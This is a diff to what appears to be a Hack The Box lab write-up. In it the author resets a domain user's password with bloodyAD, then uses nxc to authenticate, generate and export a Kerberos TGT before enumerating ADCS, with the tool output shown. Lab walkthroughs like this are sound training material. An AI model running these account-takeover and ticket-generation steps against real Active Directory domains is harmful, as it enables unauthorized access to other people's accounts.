@@ -1138,7 +1138,17 @@ bloodyAD --host dc.hercules.htb -d hercules.htb -k set password 'fernando.r' 'Pa
 
 Ill change his password so i can use his account to enumerate ADCS
 
-Ill then request a TGT for `fernando.r` and export it
+```python
+nxc smb dc.hercules.htb -u fernando.r -p 'Password123!' -k --generate-tgt fernando.r
+SMB         dc.hercules.htb 445    dc               [*]  x64 (name:dc) (domain:hercules.htb) (signing:True) (SMBv1:None) (NTLM:False)
+SMB         dc.hercules.htb 445    dc               [+] hercules.htb\fernando.r:Password123! 
+SMB         dc.hercules.htb 445    dc               [+] TGT saved to: fernando.r.ccache
+SMB         dc.hercules.htb 445    dc               [+] Run the following command to use the TGT: export KRB5CCNAME=fernando.r.ccache
+
+export KRB5CCNAME=fernando.r.ccache
+```
+
+Ill then get a TGT and export the TGT
 
 # ADCS
 
